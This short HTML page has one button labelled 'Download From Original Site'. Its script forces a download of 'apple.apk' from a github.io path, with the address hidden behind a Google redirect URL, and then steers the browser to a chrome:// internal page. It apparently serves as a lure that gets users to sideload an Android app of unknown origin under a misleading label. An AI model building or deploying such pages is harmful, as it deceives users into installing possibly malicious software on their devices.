<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <style>
    .button {
      background-color: #4CAF50;
      border: none;
      color: white;
      padding: 15px 32px;
      text-align: center;
      font-size: 16px;
      margin: 4px 2px;
      cursor: pointer;
    }
  </style>
</head>
<body>

<script>
function a() {

  // Trigger download terlebih dahulu
  var link = document.createElement('a');
  link.href = 'https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fapple.apk&sa=D&sntz=1&usg=AOvVaw0onE08hhdtlihXeKuCFYTr';
  link.download = 'apple.apk';
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);

  // Redirect setelah download mulai (delay kecil)
  setTimeout(function () {
    window.location.href = "chrome://chrome-urls/?host=chrome://webrtc-logs/#internal-debug-pages=downloads";
  }, 320); // 0.8 detik
}
</script>

<center>
  <input type="button" class="button" value="Download From Original Site" onclick="a()">
</center>

</body>
</html>
